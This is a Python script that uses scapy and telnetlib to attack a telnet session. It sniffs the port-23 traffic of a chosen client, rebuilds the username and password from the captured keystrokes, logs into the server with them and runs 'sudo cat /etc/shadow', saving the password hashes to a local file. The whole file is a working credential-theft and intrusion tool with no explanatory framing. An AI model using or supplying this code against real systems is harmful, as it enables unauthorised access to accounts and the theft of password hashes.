import telnetlib
import sys
from pip._vendor.distlib.compat import raw_input
from scapy.all import *

login = []
password = []
counter = 0

try:
    target = raw_input("Enter Desired Interface [eth0]: ")
    if target == "":
        target = "eth0"
    target1_ip = raw_input("[*] Enter Client IP: ")
    target2_ip = raw_input("[*] Enter Server IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)


def get_mac(IP, interface="eth0"):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def get_telnet_credentials(pkt):
    global counter
    global login
    global password

    try:
        pkt.getlayer(Raw).load

    except Exception as e:
        return

    payload = str(pkt.getlayer(Raw).load)
    if payload != "b'\\r\\x00'" and counter == 1:
        login.append(payload[2])
        return

    elif payload != "b'\\r\\x00'" and counter == 2:
        password.append(payload[2])
        return

    elif payload == "b'\\xff\\xfd\\x01'":
        counter = 1
        return

    elif payload == "b'\\r\\x00'":
        counter = counter + 1
        if counter == 3:
            use_telnet_credentials(login, password)
        else:
            return
    else:
        return


def use_telnet_credentials(login, password):
    global target2_ip

    str_login = ""
    str_password = ""

    for i in login:
        str_login = str_login + i
    for j in password:
        str_password = str_password + j

    print("user login: " + str_login + "| user password: " + str_password)

    try:
        tn = telnetlib.Telnet(target2_ip)
        tn.read_until(b"login: ", 2)
        tn.write(str_login.encode('ascii') + b"\n")
        tn.read_until(b"Password: ", 2)
        tn.write(str_password.encode('ascii') + b"\n")
        
    except Exception as e:
        print("an error occured: " + str(e))
        print("telnet connection with remote server couldn't be established")
        sys.exit(1)
    
    try:
        tn.write(b"sudo cat /etc/shadow\n")
        tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
        tn.write(str_password.encode('ascii') + b"\n")
        tn.write(b"exit\n")
        read_data = tn.read_all()
        with open('output_data.txt', 'w') as output:
            output.write(str(read_data))
        print("[*] Ending Telnet Session: Check output_data.txt For Shadow File Content")
        sys.exit(1)
        
    except Exception as e:
        print("an error occured: " + str(e))
        print("account not in sudoers list: shadow file unaccessible")
        sys.exit(1)


client_mac = get_mac(target1_ip)
sniff(iface=target, prn=get_telnet_credentials, filter='dst port 23 and ether src {}'.format(client_mac), store=0,
      count=0)
